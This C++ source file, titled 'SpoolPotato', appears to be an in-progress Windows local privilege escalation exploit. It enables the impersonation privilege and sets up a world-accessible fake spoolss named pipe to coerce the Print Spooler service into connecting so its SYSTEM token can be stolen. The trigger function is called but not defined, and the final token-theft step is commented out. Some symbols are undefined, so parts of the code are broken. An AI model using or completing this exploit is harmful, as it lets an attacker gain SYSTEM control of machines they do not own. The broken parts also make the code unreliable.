#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <stdint.h>
#include "IWinSpool_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning(disable: 28251)

////////
////////
// Global settings
////////

#define DEBUG
#define EXE_BUILD
//#define DLL_BUILD
//#define SHELLCODE_BUILD

////////
////////
// Debug logic
////////

#ifdef DEBUG
void DebugLog(const wchar_t* Format, ...) {
    va_list Args;
    wchar_t* pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    va_start(Args, Format);
    wvsprintfW(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
	uint32_t messageAnswer{};
	WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, g_dwSessionId, (wchar_t*)L"", 0, Buf, (wcslen(Buf) + 1) * 2, 0, 0, &messageAnswer, true);
    MessageBoxW(0, pBuffer, L"SpoolPotato", 0);
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    HeapFree(GetProcessHeap(), 0, pBuffer);
}
#endif

////////
////////
// RPC helpers
////////

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr) {
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
		return NULL;

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK)
		return NULL;

	return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle) {
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) {
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p) {
	free(p);
}

////////
////////
// Privilege/token manipulation logic
////////

BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
	BOOL bResult = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	uint32_t dwTokenPrivilegesSize = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;

	// Obtain the primary token for the current process, query its privileges (LUIDs) and find the entry which matches the specified privilege name. Once it is found use its LUID to adjust the token privileges for the process token to enable the desired privilege 
	
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, (PDWORD)&dwTokenPrivilegesSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTokenPrivilegesSize);

			if (GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, (PDWORD)&dwTokenPrivilegesSize)) {
				for (uint32_t dwX = 0; dwX < pTokenPrivileges->PrivilegeCount && !bResult; dwX++) {
					LUID_AND_ATTRIBUTES LuidAttributes = pTokenPrivileges->Privileges[dwX];
					uint32_t dwPrivilegeNameLength = 0;

					if (!LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), NULL, (PDWORD)&dwPrivilegeNameLength) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
						dwPrivilegeNameLength++; // Returned name length does not include NULL terminator
						wchar_t *pCurrentPrivilegeName = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPrivilegeNameLength * sizeof(WCHAR));

						if (LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), pCurrentPrivilegeName, (PDWORD)&dwPrivilegeNameLength)) {
							if (!_wcsicmp(pCurrentPrivilegeName, PrivilegeName)) {
								TOKEN_PRIVILEGES TokenPrivs = { 0 };
								TokenPrivs.PrivilegeCount = 1;
								TokenPrivs.Privileges[0].Luid = LuidAttributes.Luid;
								TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

								if (AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
									bResult = TRUE;
								}
							}

							HeapFree(GetProcessHeap(), 0, pCurrentPrivilegeName);
						}
					}
				}
			}

			HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
		}
		else {
			DebugLog(L"... failed to query required token information length from primary process token.");
		}

		CloseHandle(hToken);
	}
	else {
		DebugLog(L"... failed to open handle to primary token of the current process with query/modify permissions.");
	}

	return bResult;
}

////////
////////
// Spool named pipe manipulation logic
////////

BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent) {
	UUID Uuid = { 0 };

	if (UuidCreate(&Uuid) == RPC_S_OK) {
		RPC_WSTR pUuidStr = NULL;

		if (UuidToStringW(&Uuid, &pUuidStr) == RPC_S_OK && pUuidStr != NULL) {
			wchar_t FakePipeName[MAX_PATH + 1] = { 0 };
			SECURITY_DESCRIPTOR Sd = { 0 };
			SECURITY_ATTRIBUTES Sa = { 0 };

			_snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pUuidStr);
			DebugLog(L"... generate fake spool pipe name of %ws", FakePipeName);

			if (InitializeSecurityDescriptor(&Sd, SECURITY_DESCRIPTOR_REVISION)) {
				if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&Sa)->lpSecurityDescriptor), NULL)) {
					DebugLog(L"Successfully converted string sec descriptor to sec desc");
					
					if ((*phPipe = CreateNamedPipeW(FakePipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &Sa)) != NULL) { // FILE_FLAG_OVERLAPPED allows for the creation of an async pipe
						OVERLAPPED ol = { 0 };

						*phEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
						ol.hEvent = *phEvent;

						if (!ConnectNamedPipe(*phPipe, &ol)) {
							if (GetLastError() == ERROR_IO_PENDING) {
								DebugLog(L"... named pipe connection successful");
								return TRUE;
							}
							else {
								DebugLog(L"... named pipe connection failed with invalid error code");
							}
						}
						else {
							DebugLog(L"... named pipe connection succeeded while it should have failed with ERROR_IO_PENDING");
						}
					}
				}
			}
		}
	}

	return FALSE;
}

uint32_t SpoolPotato() {
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	uint32_t dwWait = 0;

	if (EnablePrivilege(SE_IMPERSONATE_NAME)) {
		DebugLog(L"... successfully obtained %ws privilege", SE_IMPERSONATE_NAME);

		if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent)) {
			DebugLog(L"... named pipe creation and connection successful.");
			DebugLog(L"[+] Named pipe listening...\n");

			if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
			{
				DebugLog(L"[-] Failed to trigger the Spooler service.\n");
				goto cleanup;
			}
			/*
			dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
			if (dwWait != WAIT_OBJECT_0)
			{
				DebugLog(L"[-] Operation failed or timed out.\n");
				goto cleanup;
			}

			GetSystem(hSpoolPipe);
			*/
		cleanup:
			if (hSpoolPipe)
				CloseHandle(hSpoolPipe);
			if (hSpoolPipeEvent)
				CloseHandle(hSpoolPipeEvent);
			if (hSpoolTriggerThread)
				CloseHandle(hSpoolTriggerThread);
		}
		else {
			DebugLog(L"... named pipe creation and connection failed");
		}
	}
	else {
		DebugLog(L"... failed to obtain %ws privilege", SE_IMPERSONATE_NAME);
	}

	return 0;
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	//DebugLog(L"... SpoolPotato launched...");
	SpoolPotato();
    return 0;
}